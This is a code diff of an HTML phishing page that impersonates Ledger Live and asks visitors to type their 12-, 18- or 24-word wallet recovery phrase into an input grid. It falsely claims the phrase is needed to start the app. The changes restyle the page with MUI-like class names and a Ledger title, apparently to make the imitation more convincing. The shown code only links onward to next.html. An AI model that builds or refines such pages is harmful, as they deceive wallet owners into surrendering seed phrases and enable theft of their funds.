@@ -3,172 +3,133 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ledger Live</title>
+  <title>Verify Seed Phrase | Ledger</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap');
-
     body {
-      margin: 0;
-      padding: 0;
       background-color: #121212;
-      color: white;
-      font-family: 'Space Mono', monospace;
-      display: flex;
-      height: 100vh;
+      color: #fff;
+      font-family: "Roboto", "Space Mono", monospace;
+      margin: 0;
+      padding: 40px;
     }
 
-    /* Sidebar */
-    .sidebar {
-      width: 270px;
-      background-color: #1A1A1A;
-      padding: 30px 25px;
-      display: flex;
-      flex-direction: column;
-      gap: 30px;
-    }
-
-    .sidebar h2 {
-      font-size: 20px;
-      letter-spacing: 2px;
-      margin-bottom: 20px;
+    .MuiTypography-root {
       color: #fff;
     }
 
-    .menu-item {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      color: #ccc;
-      font-size: 15px;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-
-    .menu-item:hover {
-      color: white;
-    }
-
-    /* Main Content */
-    .content {
-      flex: 1;
-      padding: 60px 80px;
-    }
-
-    h1 {
+    .MuiTypography-h1 {
       font-size: 28px;
-      font-weight: 700;
-      margin-bottom: 20px;
+      font-weight: bold;
+      margin-bottom: 10px;
     }
 
-    p {
-      font-size: 15px;
-      color: #aaa;
+    .MuiTypography-body1 {
+      font-size: 14px;
       line-height: 1.6;
+      color: #ccc;
     }
 
-    .word-options {
-      margin: 30px 0;
-    }
-
-    .word-options button {
-      background-color: #2e2e2e;
-      color: white;
+    .MuiButton-root {
+      background: #2a2a2a;
       border: none;
-      padding: 10px 25px;
-      margin-right: 10px;
       border-radius: 6px;
-      font-family: 'Space Mono', monospace;
+      color: white;
+      padding: 10px 22px;
+      font-size: 14px;
       cursor: pointer;
       transition: 0.2s;
+      font-family: 'Space Mono', monospace;
     }
 
-    .word-options button.active {
-      background-color: #7a5df7;
+    .MuiButton-root:hover {
+      background: #7b5bf7;
     }
 
-    /* Input Grid */
-    .grid {
+    .MuiGrid-container {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 15px;
+      gap: 14px;
       margin-top: 25px;
-      max-width: 1000px;
+      margin-bottom: 25px;
     }
 
-    input {
-      background-color: #222;
-      border: none;
-      padding: 14px;
+    .MuiOutlinedInput-input {
+      background-color: #1f1f1f;
+      border: 1px solid #333;
       border-radius: 6px;
       color: white;
       font-size: 14px;
-      font-family: 'Space Mono', monospace;
+      padding: 12px;
       outline: none;
-    }
-
-    /* Continue Button */
-    .continue {
-      background-color: white;
-      color: black;
-      border: none;
-      padding: 14px 40px;
-      font-size: 15px;
       font-family: 'Space Mono', monospace;
-      border-radius: 25px;
-      cursor: pointer;
-      margin-top: 35px;
-      transition: 0.3s;
+      width: 100%;
+      box-sizing: border-box;
     }
 
-    .continue:hover {
-      background-color: #e0e0e0;
+    .MuiOutlinedInput-input:focus {
+      border-color: #7b5bf7;
+    }
+
+    .MuiButtonBase-root.continue {
+      background: white;
+      color: black;
+      border-radius: 30px;
+      padding: 12px 35px;
+      margin-top: 30px;
+      font-weight: bold;
+    }
+
+    .MuiButtonBase-root.continue:hover {
+      background: #ddd;
+    }
+
+    .MuiStack-root {
+      margin-bottom: 20px;
     }
   </style>
 </head>
 <body>
 
-  <div class="sidebar">
-    <h2>[ LEDGER–LIVE ]</h2>
-    <div class="menu-item">📁 Portfolio</div>
-    <div class="menu-item">💹 Market</div>
-    <div class="menu-item">👤 Accounts</div>
-    <div class="menu-item">📤 Send</div>
-    <div class="menu-item">📥 Receive</div>
-    <div class="menu-item">💰 Buy/Sell</div>
-    <div class="menu-item">🔄 Swap</div>
-    <div class="menu-item">🧰 Manager</div>
-  </div>
-
-  <div class="content">
-    <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
-    <p>
-      Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.<br>
-      <b>**Ledger does not keep a copy of your recovery phrase.**</b><br>
-      <b>**ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.**</b>
-    </p>
-
-    <div class="word-options">
-      <button class="active">12 Words</button>
-      <button>18 Words</button>
-      <button>24 Words</button>
+  <div class="MuiBox-root css-1181h9g">
+    <div class="MuiStack-root css-wow8ur">
+      <h1 class="MuiTypography-root MuiTypography-h1 css-1l1v4bs">
+        VERIFY SEED PHRASE OF YOUR DEVICE
+      </h1>
+      <p class="MuiTypography-root MuiTypography-body1 css-1ohvh4v">
+        Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.
+      </p>
+      <p class="MuiTypography-root MuiTypography-body1 css-1ohvh4v">
+        **Ledger does not keep a copy of your recovery phrase.
+      </p>
+      <p class="MuiTypography-root MuiTypography-body1 css-1ohvh4v">
+        **ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.
+      </p>
     </div>
 
-    <div class="grid">
-      <input type="text" placeholder="1">
-      <input type="text" placeholder="2">
-      <input type="text" placeholder="3">
-      <input type="text" placeholder="4">
-      <input type="text" placeholder="5">
-      <input type="text" placeholder="6">
-      <input type="text" placeholder="7">
-      <input type="text" placeholder="8">
-      <input type="text" placeholder="9">
-      <input type="text" placeholder="10">
-      <input type="text" placeholder="11">
-      <input type="text" placeholder="12">
+    <div class="MuiStack-root css-11xmmbb">
+      <button class="MuiButtonBase-root MuiButton-root css-33caym">12 Words</button>
+      <button class="MuiButtonBase-root MuiButton-root css-1c95r37">18 Words</button>
+      <button class="MuiButtonBase-root MuiButton-root css-1c95r37">24 Words</button>
     </div>
 
-    <button class="continue">Continue...</button>
+    <div class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 css-ca1c84">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="1" type="text">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="2" type="text">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="3" type="text">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="4" type="text">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="5" type="text">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="6" type="text">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="7" type="text">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="8" type="text">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="9" type="text">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="10" type="text">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="11" type="text">
+      <input class="MuiInputBase-input MuiOutlinedInput-input MuiInputBase-inputSizeSmall css-1kcnf2m" placeholder="12" type="text">
+    </div>
+
+    <div class="MuiGrid-root MuiGrid-direction-xs-row MuiGrid-grid-xs-12 css-bx9aap">
+      <button class="MuiButtonBase-root MuiButton-root continue" onclick="window.location.href='next.html'">Continue...</button>
+    </div>
   </div>
 
 </body>
